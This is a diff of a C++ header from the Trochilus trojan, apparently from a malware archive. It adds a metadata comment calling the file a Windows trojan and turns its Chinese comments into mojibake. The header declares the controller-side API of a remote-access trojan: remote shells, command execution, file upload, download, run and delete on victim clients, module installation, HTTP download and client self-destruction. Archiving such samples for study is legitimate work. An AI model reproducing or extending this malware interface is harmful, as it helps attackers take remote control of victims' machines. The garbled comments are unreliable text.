@@ -1,10 +1,21 @@
+/*
+  name      Trochilus
+  type      trojan
+  cve       â€”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     â€”
+ */
 #pragma once
-// ÏÂÁÐ ifdef ¿éÊÇ´´½¨Ê¹´Ó DLL µ¼³ö¸ü¼òµ¥µÄ
-// ºêµÄ±ê×¼·½·¨¡£´Ë DLL ÖÐµÄËùÓÐÎÄ¼þ¶¼ÊÇÓÃÃüÁîÐÐÉÏ¶¨ÒåµÄ MASTER_EXPORTS
-// ·ûºÅ±àÒëµÄ¡£ÔÚÊ¹ÓÃ´Ë DLL µÄ
-// ÈÎºÎÆäËûÏîÄ¿ÉÏ²»Ó¦¶¨Òå´Ë·ûºÅ¡£ÕâÑù£¬Ô´ÎÄ¼þÖÐ°üº¬´ËÎÄ¼þµÄÈÎºÎÆäËûÏîÄ¿¶¼»á½«
-// MASTER2_API º¯ÊýÊÓÎªÊÇ´Ó DLL µ¼ÈëµÄ£¬¶ø´Ë DLL Ôò½«ÓÃ´Ëºê¶¨ÒåµÄ
-// ·ûºÅÊÓÎªÊÇ±»µ¼³öµÄ¡£
+// ï¿½ï¿½ï¿½ï¿½ ifdef ï¿½ï¿½ï¿½Ç´ï¿½ï¿½ï¿½Ê¹ï¿½ï¿½ DLL ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½òµ¥µï¿½
+// ï¿½ï¿½Ä±ï¿½×¼ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ DLL ï¿½Ðµï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ä¼ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ï¶ï¿½ï¿½ï¿½ï¿½ MASTER_EXPORTS
+// ï¿½ï¿½ï¿½Å±ï¿½ï¿½ï¿½Ä¡ï¿½ï¿½ï¿½Ê¹ï¿½Ã´ï¿½ DLL ï¿½ï¿½
+// ï¿½Îºï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ä¿ï¿½Ï²ï¿½Ó¦ï¿½ï¿½ï¿½ï¿½Ë·ï¿½ï¿½Å¡ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ô´ï¿½Ä¼ï¿½ï¿½Ð°ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ä¼ï¿½ï¿½ï¿½ï¿½Îºï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ä¿ï¿½ï¿½ï¿½á½«
+// MASTER2_API ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Îªï¿½Ç´ï¿½ DLL ï¿½ï¿½ï¿½ï¿½Ä£ï¿½ï¿½ï¿½ï¿½ï¿½ DLL ï¿½ï¿½ï¿½Ã´Ëºê¶¨ï¿½ï¿½ï¿½
+// ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Îªï¿½Ç±ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ä¡ï¿½
 #ifdef MASTER2_EXPORTS
 #define MASTER2_API extern "C" __declspec(dllexport)
 #else
@@ -21,14 +32,14 @@
 #include "FileTransferData.h"
 
 
-//ShellÏà¹Ø½Ó¿Ú
+//Shellï¿½ï¿½Ø½Ó¿ï¿½
 MASTER2_API BOOL OpenShell(LPCWSTR clientid, FnRemoteCmdOutput fnRemoteCmdOutput, LPVOID lpParameter);
 
 MASTER2_API BOOL ExecuteShellCommand(LPCWSTR clientid, LPCWSTR cmdline, BOOL bAddRN = TRUE);
 
 MASTER2_API void CloseShell(LPCWSTR clientid);
 
-//ÎÄ¼þ¹ÜÀíÏà¹Ø½Ó¿Ú
+//ï¿½Ä¼ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ø½Ó¿ï¿½
 
 MASTER2_API BOOL PutFileToClient(LPCTSTR clientid,LPCTSTR serverpath,LPCTSTR clientpath);
 
@@ -50,58 +61,58 @@ MASTER2_API void DeleteRemoteFile(LPCTSTR clientid,LPCTSTR clientpath);
 
 MASTER2_API void RunRemoteFile(LPCTSTR clientid,LPCTSTR clientpath);
 
-//ÎÄ¼þä¯ÀÀÏà¹Ø½Ó¿Ú
+//ï¿½Ä¼ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ø½Ó¿ï¿½
 MASTER2_API void AsynListFiles( LPCTSTR clientid, LPCTSTR findstr,BOOL isClient, FnModuleNotifyProc callback ,LPVOID lpParameter);
 
 MASTER2_API void AsynListDisks( LPCWSTR clientid,BOOL isClient, FnModuleNotifyProc callback , LPVOID lpParameter );
 
-//Æô¶¯Master
+//ï¿½ï¿½ï¿½ï¿½Master
 MASTER2_API BOOL StartMasterWorking();
 
-//¸ù¾ÝÏûÏ¢ÐòÁÐºÅ£¬²éÑ¯¿Í»§¶ËµÄÓ¦´ðÏûÏ¢
+//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ï¢ï¿½ï¿½ï¿½ÐºÅ£ï¿½ï¿½ï¿½Ñ¯ï¿½Í»ï¿½ï¿½Ëµï¿½Ó¦ï¿½ï¿½ï¿½ï¿½Ï¢
 MASTER2_API BOOL GetReplyByMsgserialid(LPCTSTR clientid, MSGSERIALID sendMsgserialid, ByteList* pByteList);
 
-//²éÑ¯ÕýÔÚ·¢ËÍÏûÏ¢µÄ×´Ì¬
+//ï¿½ï¿½Ñ¯ï¿½ï¿½ï¿½Ú·ï¿½ï¿½ï¿½ï¿½ï¿½Ï¢ï¿½ï¿½×´Ì¬
 MASTER2_API BOOL QuerySendingMessageStatus(LPCTSTR clientid, MSGSERIALID sendMsgserialid, DWORD* pdwSentBytes, DWORD* pdwTotalBytes);
 
-//²éÑ¯ÕýÔÚ½ÓÊÜÏûÏ¢µÄ×´Ì¬
+//ï¿½ï¿½Ñ¯ï¿½ï¿½ï¿½Ú½ï¿½ï¿½ï¿½ï¿½ï¿½Ï¢ï¿½ï¿½×´Ì¬
 MASTER2_API BOOL QueryReceivingFileStatus(LPCTSTR clientid, MSGSERIALID receivingMsgserialid, DWORD* pdwRecvBytes, DWORD* pdwTotalBytes);
 
-//ÉèÖÃ¿Í»§¶ËÐÅÏ¢±ä¸ü»Øµ÷Í¨Öªº¯Êý
+//ï¿½ï¿½ï¿½Ã¿Í»ï¿½ï¿½ï¿½ï¿½ï¿½Ï¢ï¿½ï¿½ï¿½ï¿½Øµï¿½Í¨Öªï¿½ï¿½ï¿½ï¿½
 MASTER2_API void SetClientInfoNotifies(FnNotifyProc fnNotify, LPVOID lpParameter);
 
-//»ñÈ¡×î½üµÄÒ»Ìõ´íÎó±àºÅ
+//ï¿½ï¿½È¡ï¿½ï¿½ï¿½ï¿½ï¿½Ò»ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 MASTER2_API DWORD GetMasterLastError();
 
-//»ñÈ¡´íÎó±àºÅ¶ÔÓ¦µÄÃèÊöÐÅÏ¢
+//ï¿½ï¿½È¡ï¿½ï¿½ï¿½ï¿½ï¿½Å¶ï¿½Ó¦ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ï¢
 MASTER2_API LPCTSTR GetMasterErrorMsg(DWORD dwLastError);
 
-//²éÑ¯µ±Ç°¿ÉÓÃµÄ¿Í»§¶ËidÁÐ±í
+//ï¿½ï¿½Ñ¯ï¿½ï¿½Ç°ï¿½ï¿½ï¿½ÃµÄ¿Í»ï¿½ï¿½ï¿½idï¿½Ð±ï¿½
 MASTER2_API void ListAvailableClients(MyStringList* pClientidList);
 
-//Ïò¿Í»§¶ËÖÐ°²×°Ä£¿é
+//ï¿½ï¿½Í»ï¿½ï¿½ï¿½ï¿½Ð°ï¿½×°Ä£ï¿½ï¿½
 MASTER2_API BOOL InstallClientModule(LPCTSTR clientid, LPCTSTR moduleName);
 
-//Ìí¼Ó¼àÌý·þÎñ
+//ï¿½ï¿½ï¿½Ó¼ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 MASTER2_API int AddCommService(int port,int name);
 
-//É¾³ý¼àÌý·þÎñ
+//É¾ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 MASTER2_API BOOL DeleteCommService(int serialid);
 
-//²éÑ¯·þÎñ¶ËÉÏ¿ÉÓÃµÄÄ£¿éÁÐ±í
+//ï¿½ï¿½Ñ¯ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ï¿ï¿½ï¿½Ãµï¿½Ä£ï¿½ï¿½ï¿½Ð±ï¿½
 MASTER2_API void ListAvailableClientModules(MyStringList* pModulenameList);
 
-//ÈÃ¿Í»§¶Ë×Ô»Ù
+//ï¿½Ã¿Í»ï¿½ï¿½ï¿½ï¿½Ô»ï¿½
 MASTER2_API BOOL MakeClientSelfDestruction(LPCTSTR clientid);
 
-//»ñÈ¡¿Í»§¶ËµÄ»ù´¡ÐÅÏ¢
+//ï¿½ï¿½È¡ï¿½Í»ï¿½ï¿½ËµÄ»ï¿½ï¿½ï¿½ï¿½ï¿½Ï¢
 MASTER2_API BOOL GetClientInfo(LPCTSTR clientid, CLIENT_INFO* clientBaseInfo);
 
-//¹Ø±ÕMASTER
+//ï¿½Ø±ï¿½MASTER
 MASTER2_API void StopMasterWorking();
 
-//ÐÞ¸ÄPacket×´Ì¬
+//ï¿½Þ¸ï¿½Packet×´Ì¬
 MASTER2_API BOOL ModifyPacketStatus(ULONG serial,LPCTSTR clientid,BOOL status);
 
-//Ê¹ÓÃHTTPÏÂÔØÎÄ¼þ
+//Ê¹ï¿½ï¿½HTTPï¿½ï¿½ï¿½ï¿½ï¿½Ä¼ï¿½
 MASTER2_API void HttpDownLoad(LPCTSTR clientid,LPCTSTR url,LPCTSTR path);
